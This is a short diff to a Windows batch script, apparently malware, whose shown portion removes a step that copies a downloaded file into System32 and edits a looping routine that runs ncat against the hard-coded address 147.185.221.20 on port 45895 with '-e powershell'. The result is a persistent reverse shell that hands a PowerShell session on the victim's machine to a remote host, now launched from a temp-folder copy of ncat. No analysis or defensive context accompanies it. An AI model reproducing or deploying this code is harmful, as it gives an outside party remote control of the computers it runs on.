@@ -27,16 +27,10 @@ if not exist "%tempdir%\%installer%" (
     goto :eof
 )
 
-:: Move the downloaded file to a location in the PATH
-move "%tempdir%\%installer%" "%systemroot%\System32\%installer%"
-
-:: Clean up
-rmdir "%tempdir%"
-
 :ncat
 set "host=147.185.221.20"
 set "port=45895"
-ncat %host% %port% -e powershell
+%tempdir%\ncat %host% %port% -e powershell
 goto ncat
 
 :end
